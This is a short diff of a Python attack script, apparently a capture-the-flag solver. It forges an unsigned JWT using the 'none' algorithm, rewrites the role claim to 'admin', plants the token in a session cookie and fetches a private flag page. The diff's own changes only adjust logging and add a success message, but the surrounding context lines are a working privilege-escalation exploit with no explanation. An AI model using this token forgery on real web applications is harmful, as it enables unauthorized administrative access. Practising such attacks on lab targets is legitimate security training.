@@ -63,12 +63,14 @@ def main():
                 payload["role"] = "admin"
                 fake_jwttoken = jwt.encode(payload, None, algorithm="none")
                 logging.info("regenerate a jwt token using 'none' algorithm and changing the role into 'admin'")
-                logging.info(fake_jwttoken + "\n")
+                logging.info(fake_jwttoken.decode("utf-8") + "\n")
                 
                 cookie.value = fake_jwttoken.decode("utf-8")
                 break
         flag_page = session_requests.get(private_page_url, headers = headers)
-        logging.info(flag_page.text)
+        logging.info("\n" + flag_page.text + "\n")
+
+        logging.info("Yeah, now we successfully login as admin!")
     else:
         logging.error("Failed to login the website, please check the options.")
         sys.exit(1)
